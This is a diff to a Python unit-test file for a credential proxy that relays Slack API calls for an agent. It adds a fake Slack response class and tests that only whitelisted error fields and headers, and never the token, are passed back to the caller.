+        """Stands in for slack_sdk's SlackResponse.
+
+        The payload lives on ``data``; the object itself is not a mapping and
+        defines no ``keys()``, so ``dict(response)`` falls back to the iterator
+        protocol and raises, exactly as the real class does.
+        """
+
+        def __init__(self, data, headers=None):
+            self.data = data
+            self.headers = headers or {}
+
+        def __iter__(self):
+            return iter([self])
+
     class FakeClient:
         token = "xoxb-not-returned"
 
         def api_call(self, method, **arguments):
-            return {"ok": True, "method": method, "arguments": arguments}
+            return SlackRelayTest.FakeResponse(
+                {"ok": True, "method": method, "arguments": arguments},
+                headers={"x-oauth-scopes": "chat:write", "other": "ignored"},
+            )
 
     def relay(self):
         relay = SlackRelay.__new__(SlackRelay)
@@ -428,6 +1185,7 @@ class SlackRelayTest(unittest.TestCase):
         self.assertEqual("future.method", result["method"])
         self.assertEqual(arguments, result["arguments"])
         self.assertNotIn("token", json.dumps(result))
+        self.assertEqual({"x-oauth-scopes": "chat:write"}, result.get("__headers"))
 
     def test_nack_requeues_event(self):
         relay = self.relay()
@@ -480,6 +1238,131 @@ class SlackRelayTest(unittest.TestCase):
             path = Path(directory) / "upload"
             path.write_bytes(b"1234")
             self.assertEqual(b"1234", read_upload(path, 4))
+
+    def test_slack_error_detail_serializes_response_to_json(self):
+        exc_with_data = Exception()
+        exc_with_data.response = types.SimpleNamespace(
+            data={"ok": False, "error": "invalid_auth"}
+        )
+        self.assertEqual(
+            '{"error": "invalid_auth", "ok": false}',
+            _slack_error_detail(exc_with_data),
+        )
+
+        exc_with_dict = Exception()
+        exc_with_dict.response = {"error": "ratelimited"}
+        self.assertEqual(
+            '{"error": "ratelimited"}',
+            _slack_error_detail(exc_with_dict),
+        )
+
+        exc_without_response = Exception("network error")
+        self.assertEqual("unknown", _slack_error_detail(exc_without_response))
+
+    def test_slack_error_fields_relays_only_the_whitelist(self):
+        """The payload is a response to a call made with the relay's token.
+
+        It goes both into the log and back across the proxy boundary to the
+        agent, so only the diagnostic keys may cross — never whatever else a
+        future Slack error body decides to carry.
+        """
+        exc = Exception()
+        exc.response = types.SimpleNamespace(
+            data={
+                "ok": False,
+                "error": "missing_scope",
+                "needed": "chat:write",
+                "provided": "channels:read",
+                "response_metadata": {"messages": ["internal detail"]},
+            }
+        )
+        self.assertEqual(
+            {
+                "ok": False,
+                "error": "missing_scope",
+                "needed": "chat:write",
+                "provided": "channels:read",
+            },
+            _slack_error_fields(exc),
+        )
+
+    def test_slack_error_fields_separates_no_payload_from_an_empty_one(self):
+        # An empty dict means Slack answered but said nothing relayable; None
+        # means there was no response object at all. The handler branches on
+        # the difference, so the two must not collapse into one another.
+        exc_with_unrelayable_payload = Exception()
+        exc_with_unrelayable_payload.response = {"warning": "superfluous_charset"}
+        self.assertEqual({}, _slack_error_fields(exc_with_unrelayable_payload))
+
+        self.assertIsNone(_slack_error_fields(Exception("network error")))
+
+    def _slack_api_post(self, api_call):
+        """Drive the relay's POST handler with an api_call of our choosing."""
+        relay = self.relay()
+        relay.api_call = api_call
+        handler = CredentialProxyHandler.__new__(CredentialProxyHandler)
+        handler.slack_relay = relay
+        handler.slack_max_request_bytes = 1024
+        handler.path = "/v1/chat/slack/api"
+        handler._read_json_body = lambda _max_bytes=None: {
+            "teamId": "T123",
+            "method": "chat.postMessage",
+            "arguments": {},
+        }
+        captured = {}
+        handler._json = lambda status, payload: captured.update(
+            status=status, payload=payload
+        )
+        with self.assertLogs("credential-proxy", level="WARNING"):
+            handler._handle_slack_post()
+        return captured
+
+    def test_a_rejected_call_tells_the_agent_why(self):
+        """The Slack error code has to survive the trip back, not just be logged.
+
+        Every failure behind the proxy answers 502, so without the ``slack``
+        object the caller cannot tell channel_not_found from missing_scope from
+        the relay being down — and slack_relay_patch has nothing to rebuild the
+        SlackApiError from.
+        """
+
+        def rejected(*_args, **_kwargs):
+            exc = Exception("The request to the Slack API failed.")
+            exc.response = types.SimpleNamespace(
+                data={
+                    "ok": False,
+                    "error": "channel_not_found",
+                    "response_metadata": {"messages": ["internal detail"]},
+                }
+            )
+            raise exc
+
+        captured = self._slack_api_post(rejected)
+
+        self.assertEqual(HTTPStatus.BAD_GATEWAY, captured["status"])
+        self.assertEqual(
+            {
+                "error": "Slack operation failed",
+                "slack": {"ok": False, "error": "channel_not_found"},
+            },
+            captured["payload"],
+        )
+        self.assertNotIn("internal detail", json.dumps(captured["payload"]))
+
+    def test_a_relay_failure_carries_no_slack_object(self):
+        """Nothing to relay means no ``slack`` key, so the shim re-raises.
+
+        A transport failure has to stay distinguishable from a Slack rejection
+        on the agent side, and its only signal is the key's absence.
+        """
+
+        def broken(*_args, **_kwargs):
+            raise RuntimeError("connection reset")
+
+        captured = self._slack_api_post(broken)
+
+        self.assertEqual(HTTPStatus.BAD_GATEWAY, captured["status"])
+        self.assertEqual({"error": "Slack operation failed"}, captured["payload"])
 
 
 if __name__ == "__main__":
